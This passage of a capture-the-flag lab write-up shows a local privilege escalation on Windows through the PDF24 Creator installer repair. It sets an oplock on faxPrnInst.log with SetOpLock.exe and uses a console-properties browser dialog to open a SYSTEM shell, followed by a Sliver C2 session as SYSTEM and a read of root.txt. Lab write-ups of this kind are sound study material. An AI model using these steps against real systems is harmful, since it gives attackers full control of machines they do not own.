At the very end of the repair process, the sub-process pdf24-PrinterInstall.exe gets called with SYSTEM privileges and performs a write action on the file
"C:\Program Files\PDF24\faxPrnInst.log". This can be used by an attacker by simply setting an oplock on the file as soon as it gets read. To do that, one can use the 'SetOpLock.exe' tool from "https://github.com/googleprojectzero/symboliclink-testing-tools"
with the following parameters:

SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r

If the oplock is set, the cmd window that gets opened when pdf24-PrinterInstall.exe is executed doesn't close. The attacker can then perform the following actions to spawn a SYSTEM shell:
- right click on the top bar of the cmd window
- click on properties
- under options click on the "Legacyconsolemode" link
- open the link with a browser other than internet explorer or edge (both don't open as SYSTEM when on Win11)
- in the opened browser window press the key combination CTRL+o
- type cmd.exe in the top bar and press Enter
```

To start with the steps of the `PoC` I downloaded the mentioned tools and copied `SetOpLock.exe` to the box.

- [https://github.com/googleprojectzero/symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)

As first steps I set up the `lock` inside a `cmd shell`.

![](images/2024-03-23_07-53_privilege_escalation_preparation.png)

Next I opened another `cmd shell` and started the `repair process`.

```c
C:\Users\gale.dekarios>msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
```

![](images/2024-03-23_08-02_installer.png)

In the following dialog I chose the `second option` which avoided a reboot at the end which was required to enter the relevant stage of the exploitation.

![](images/2024-03-23_08-04_installer_option.png)

The repair process took some time but at the end, the `cmd shell` had `stopped` as expected.

![](2024-03-23_08-04_installer_progress.png)

![](images/2024-03-23_08-06_cmd_window.png)

I followed the steps and `right clicked` the `window bar` to enter the `properties menu`.

![](images/2024-03-23_08-06_cmd_window_properties.png)

After clicking on the link for `legacy console mode` I had to chose which browser should be used for opening the link. According to the `PoC` I selected `Firefox`.

![](images/2024-03-23_08-06_cmd_window_properties_firefox.png)

- [https://go.microsoft.com/fwlink/?LinkId=871150](https://go.microsoft.com/fwlink/?LinkId=871150)

By pressing `Ctrl+o` a new `explorer window` opened in which I typed in `cmd.exe` to the `address bar` and hit `enter`. A new `cmd shell` opened with `NT Authority\System` privileges.

![](images/2024-03-23_08-06_cmd_window_properties_cmd_as_system.png)

As before and for documentation purposes, I spawned another `Sliver session` by accessing my payload in `C:\temp\`.

```c
[*] Session f3bc4aa9 OVERSEAS_APPEAL - 10.10.87.100:55775 (Lock) - windows/amd64 - Sat, 23 Mar 2024 08:09:14 EDT

sliver > sessions

 ID         Name              Transport   Remote Address       Hostname   Username              Operating System   Locale   Last Message                            Health  
========== ================= =========== ==================== ========== ===================== ================== ======== ======================================= =========
 f3bc4aa9   OVERSEAS_APPEAL   http(s)     10.10.87.100:55775   Lock       NT AUTHORITY\SYSTEM   windows/amd64      en-US    Sat Mar 23 08:09:17 EDT 2024 (1s ago)   [ALIVE]
```

## root.txt

```c
sliver (OVERSEAS_APPEAL) > cat C:\\Users\\Administrator\\Desktop\\root.txt
VL{REDACTED}
```